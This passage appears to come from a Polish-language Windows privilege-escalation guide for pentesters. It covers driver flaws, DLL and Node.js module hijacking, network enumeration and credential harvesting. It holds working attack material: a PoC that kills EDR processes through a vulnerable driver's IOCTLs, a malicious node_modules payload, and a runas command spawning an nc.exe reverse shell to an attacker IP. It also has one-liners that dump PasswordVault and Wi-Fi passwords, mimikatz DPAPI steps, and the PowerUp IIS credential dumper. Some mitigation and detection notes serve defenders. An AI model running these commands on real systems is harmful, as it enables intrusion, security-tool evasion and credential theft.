Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callback/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni wymaga, aby `EntryContext` wskazywał na `UNICODE_STRING`. Jeśli kod najpierw wczyta kontrolowany przez atakującego `REG_DWORD` do zmiennej skalarnej na stosie, a następnie ponownie użyje tego samego bufora do odczytu ciągu, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, uzyskując częściowo kontrolowany zapis do jądra.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytej zmiennej kontrolowaną przez atakującego **ujemną** wartość, następne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich slotów stosu, co często stanowi najprostszy sposób na pełne nadpisanie wskaźnika callback.

Silny wzorzec do wyszukiwania: **niejednorodne odczyty rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Szukaj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używanych wskaźników `EntryContext` oraz ścieżek kodu, w których pierwszy odczyt rejestru decyduje o wykonaniu drugiego.

#### Wykorzystanie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + EDR kill)

Niektóre podpisane sterowniki firm trzecich tworzą obiekt urządzenia z silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana, gdy urządzenie zostaje otwarte przez ścieżkę zawierającą dodatkowy komponent. Dzięki temu dowolny nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, może wykorzystać udostępnione przez sterownik uprzywilejowane IOCTL-e do uzyskania LPE i manipulowania systemem. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokenów / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowych danych na dysku (manipulacja offline, sztuczki z trwałością podczas rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala zabić AV/EDR z poziomu user land za pośrednictwem jądra.

Minimalny schemat PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigacje dla developerów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego przy operacjach uprzywilejowanych. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTL (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele z brokerem zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie podejrzanych nazw urządzeń w trybie użytkownika (np. \\ .\\amsdk*) oraz określone sekwencje IOCTL wskazujące na nadużycie.
- Egzekwuj listę blokowanych podatnych sterowników Microsoftu (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zablokowanych elementów.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się w PATH**, możesz przejąć kontrolę nad DLL ładowanym przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów w PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak nadużyć tego mechanizmu sprawdzania:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Przejęcie rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bez ścieżki, taki jak `require("foo")`, a oczekiwanego modułu **brakuje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, dlatego aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik o niskich uprawnieniach** może utworzyć `C:\node_modules`, może umieścić tam złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż **proces Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie uruchomiony w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, gdy cel działa jako administrator, w ramach podwyższonego zadania zaplanowanego lub opakowującej usługi albo jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Jest to szczególnie częste, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet usunięto z kompilacji produkcyjnych, pominięto podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania modułów:<sup>[[23]](#references)</sup>

- Ustaw filtr `Process Name` = plik wykonywalny celu (`node.exe`, plik EXE aplikacji Electron lub proces opakowujący)
- Ustaw filtr `Path` `contains` `node_modules`
- Skup się na wynikach `NAME NOT FOUND` i ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukiwania podczas przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **brakującą nazwę pakietu** na podstawie Procmon lub analizy źródła.
2. Utwórz katalog wyszukiwania w katalogu głównym, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowego modułu brakuje, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący import bare**, który uprzywilejowany proces Node/Electron w systemie Windows rozwiąże.

### Pomysły na wykrywanie i hardening

- Generuj alerty, gdy użytkownik tworzy `C:\node_modules` lub zapisuje tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności, które odczytują dane z `C:\node_modules\*`.
- Pakuj wszystkie zależności środowiska uruchomieniowego w środowisku produkcyjnym i audytuj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}` ignorujących błędy.
- Wyłączaj opcjonalne sprawdzanie, jeśli biblioteka to umożliwia (na przykład niektóre wdrożenia `ws` mogą uniknąć sprawdzania starszego `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts nie zapisano na stałe nazw innych znanych komputerów.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz, czy dostępne są **usługi objęte ograniczeniami**.

```bash
netstat -ano #Opened ports?
```

Dla lokalnego listenera powiąż jego PID z właścicielem procesu, ścieżką do pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego sterowania może zapewnić dostęp jako jej użytkownik pulpitu tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie o wyższych uprawnieniach to osobny cel analizy: listener i ścieżka do pliku binarnego są jedynie wskazówkami pasywnymi, natomiast uwierzytelniony wektor wykorzystujący uszkodzenie pamięci wymaga analizy tego konkretnego pliku binarnego i dostępnych dla niego danych wejściowych. Jeśli wydaje się, że ujawniony port należy do procesu systemowego, porównaj go z wynikiem polecenia [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz mu usługę backendową; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tablica routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby znaleźć polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej [poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można znaleźć również w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się okno GUI z pytaniem, czy `nc` ma być dozwolony przez firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

System plików `WSL` możesz przeglądać w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Uprawnienia `root` w systemie Linux działającym w WSL same w sobie nie nadają uprawnień Administratora systemu Windows. Jeśli bieżąca tożsamość systemu Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające; eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach i dozwolonej metody uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; WSL 2 zwykle przechowuje dystrybucję na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal rzeczywistą dystrybucję i ścieżkę przechowywania. Unikaj wyświetlania zawartości historii podczas automatycznego wyszukiwania.

## Poświadczenia systemu Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie dane uwierzytelniające. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza, że w rejestrze znaleziono hasło w postaci jawnego tekstu. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to jedynie wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia danych uwierzytelniających sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Źródło: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników używane przez **Windows** do **automatycznego logowania użytkowników** do serwerów, witryn internetowych i innych programów. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail, aby przeglądarki logowały ich automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows wymagająca poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny internetowej) **może korzystać z tego Credential Manager i Windows Vault**, używając zapisanych poświadczeń zamiast za każdym razem prosić użytkowników o podanie nazwy użytkownika i hasła.

O ile aplikacje nie komunikują się z Credential Manager, nie sądzę, aby mogły używać poświadczeń dla danego zasobu. Jeśli więc aplikacja ma korzystać ze skarbca, powinna w jakiś sposób **komunikować się z Credential Manager i pobierać z domyślnego skarbca przechowywania poświadczenia dotyczące danego zasobu**.

Użyj `cmdkey`, aby wyświetlić listę zapisanych na komputerze poświadczeń.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład uruchamia zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem poświadczeń.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zwróć uwagę na mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub moduł [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające i hasła w postaci zwykłego tekstu w `PasswordVault` platformy Universal Windows Platform (UWP) (widocznym również jako `Web Credentials` w `vaultcmd`). Ta przestrzeń przechowywania jest odizolowana dla każdej sesji i można ją odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w postaci zwykłego tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** udostępnia metodę symetrycznego szyfrowania danych, wykorzystywaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z danych logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniające domeny systemu.

Zaszyfrowane klucze RSA użytkownika, chronione przez DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, choć można ją wyświetlić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptów** i zadań automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Jeśli skrypt lub inwentaryzacja plików wskazuje takie poświadczenie, ustal rzeczywisty katalog profilu konta, zamiast zakładać, że znajduje się on w `C:\Users`: [system Windows może przechowywać profile w innym miejscu](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Odczytywalny plik to jedynie wskazówka; [funkcja Windows `Export-Clixml` wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, które je wyeksportowały](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a odzyskane konto musi niezależnie posiadać odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając zaszyfrowanych ani jawnych wartości podczas rutynowej inwentaryzacji.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu Mimikatz `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować wszystkie pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwyczajnych nazwach, takich jak `config.xml`. Ustal schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za źródło danych logowania. Zapisana wartość nie jest hasłem DPAPI/RDCMan; możliwość jej odzyskania zależy od ustawień szyfrowania pliku i od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego przeszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być też czytelne w katalogach użytkowników lub we współdzielonym folderze administracyjnym. Starszy eksport `profiles.xml` zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako potencjalne źródło danych logowania, ale go nie wyświetlaj ani nie zakładaj, że zawiera tekst jawny: [producent informuje](https://www.donkz.nl/), że ochrona profilu może być powiązana z kontem i komputerem, na których został utworzony, albo skonfigurowana mniej rygorystycznie. Przed wykorzystaniem pliku ustal jego pochodzenie i warunki odzyskania danych.

### Sticky Notes

Użytkownicy często korzystają z aplikacji Sticky Notes na stacjach roboczych z Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Plik znajduje się pod ścieżką `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać oraz sprawdzić.

Użytkownicy czasem zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Pakietowa aplikacja Sticky Notes firmy Microsoft zwykle przechowuje notatki pod ścieżką `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą używać odmiennych magazynów w profilu użytkownika, w tym LevelDB. Zanim uznasz brak pliku SQLite za dowód braku notatek, ustal, jaka aplikacja jest zainstalowana i jakiego formatu pamięci używa.

Jeśli Sticky Notes korzysta z dziennika zapisu z wyprzedzeniem SQLite, sama kopia `plum.sqlite` może nie zawierać ostatnich zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych i dołącz `plum.sqlite-shm`, jeśli jest dostępny; indeks w pamięci współdzielonej można odbudować, ale WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatkę zawierającą nazwę konta lub hasło traktuj wyłącznie jako potencjalne źródło danych logowania: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis menedżera haseł wymaga ponadto rzeczywistego klucza deszyfrującego i interpretacji właściwej dla danej aplikacji, zanim będzie można uznać go za potwierdzenie dostępu do konta o wyższych uprawnieniach.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz być Administratorem i uruchomić je z poziomem High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano jakieś **dane logowania**, które można **odzyskać**.

Ten kod pochodzi z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy istnieje `C:\Windows\CCM\SCClient.exe`.\
Instalatory są **uruchamiane z uprawnieniami SYSTEM, wiele z nich jest podatnych na DLL Sideloading (informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (poświadczenia)

### Artefakty poświadczeń w rejestrze narzędzi wsparcia

Niektóre starsze instalacje oprogramowania do zdalnego wsparcia zachowują nazwy wartości związane z hasłami pod stałymi kluczami rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer oznaczało skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości to jedynie wskazówka do weryfikacji: przed oceną poświadczenia sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżący sposób uwierzytelniania. Wykorzystanie hasła do zdalnego wsparcia w celu uzyskania dostępu do bardziej uprzywilejowanego konta Windows wymaga również faktycznego ponownego użycia hasła i uprawnień do tego konta. Nie umieszczaj szyfrogramów ani odzyskanych haseł w rutynowych wynikach enumeracji.

### Współdzielone arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny współdzielony skoroszyt zawiera dane kont, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczeń; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Przeglądaj wyłącznie pliki, do których masz uprawnienia i które są istotne, a podczas szerokiej enumeracji unikaj wyświetlania potencjalnych sekretów. Sama ścieżka do czytelnego pliku `.xlsx`, chroniony arkusz ani ukryta kolumna nie dowodzą, że istnieją tam poświadczenia lub że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj dane i bieżące uprawnienia konta.

### Zachowane poprawki zmian na serwerze CI

